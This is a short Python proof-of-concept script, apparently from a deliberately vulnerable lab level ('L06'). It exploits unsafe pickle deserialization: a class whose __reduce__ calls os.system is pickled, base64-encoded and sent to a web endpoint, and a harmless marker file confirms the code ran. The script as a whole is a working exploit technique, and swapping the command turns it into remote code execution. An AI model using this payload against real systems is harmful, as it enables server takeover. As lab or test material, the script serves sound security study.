"""L06 unsafe deserialization PoC.

config.PREF_FORMAT defaults to "legacy", so prefs.decode_prefs() runs
pickle.loads() on the attacker-supplied base64 blob. A crafted pickle
executes code on load; here it just creates a marker file to prove it,
locally and harmlessly.
"""
import base64
import os
import pickle
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

mod, _, _ = load_level("L06")
ok(mod.prefs.config.PREF_FORMAT == "legacy", "default config reaches the pickle path")
client = mod.app.test_client()

marker = os.path.join(tempfile.gettempdir(), "L06_rce_marker_proof")
if os.path.exists(marker):
    os.remove(marker)


class Boom:
    def __reduce__(self):
        # benign proof of code execution: create a local marker file
        return (os.system, (f"touch {marker}",))


blob = base64.b64encode(pickle.dumps(Boom())).decode()
client.get("/view", query_string={"prefs": blob})
ok(os.path.exists(marker), "pickle payload executed code on the server (marker created)")
os.remove(marker)
print("L06 exploit confirmed")
